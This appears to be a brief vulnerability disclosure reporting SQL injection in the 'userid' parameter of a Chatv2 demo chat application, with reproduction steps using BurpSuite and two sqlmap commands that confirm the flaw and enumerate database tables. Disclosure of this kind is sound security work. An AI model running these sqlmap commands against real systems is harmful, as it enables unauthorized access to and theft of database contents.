## Chatv2 has SQL injection Vulnerability Description
- Author: Eddie TC CHANG, YUNG-HAO TSENG, YU-HSIANG HUANG
- Contact: eddietcchang@gmail.com; 0xuhaw@gmail.com; huang.yuhsiang.phone@gmail.com
---
### Testing Target
- Product: chat
- Version: 2
- Official Website: https://css-tricks.com/chat2/
- Github: N/A

### Summary
The Chatv2 has SQL injection.

### Description
The `userid` parameter in `/chat2/jumpin.php` has SQL injection vulnerability.
 
### Concept
1. Build the chat2 test environment, and create a chat then send test message out.
![](./png/1.png)
2. Back to default page, input new desired username. Use BurpSuite to intercept POST package for sqlmap test before submitting.
![](./png/2.png)
![](./png/3.png)
3. SQL injection testing via sqlmap. Find out valid payload, then obtain web server’s information and can further enumerate DB, table or other use.
**payload:**`py -2 sqlmap.py -r D:\sql.txt -p userid --dbms mysql --level 5 --risk 3 --threads=5`
![](./png/4.png)
**payload:**`py -2 sqlmap.py -r D:\sql.txt -p userid --dbms mysql --level 5 --risk 3 --threads=5 -D chat2_db --tables`
![](./png/5.png)
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTEyMjc4Njg5MDQsLTE0NDc2NzUxMDBdfQ
==
-->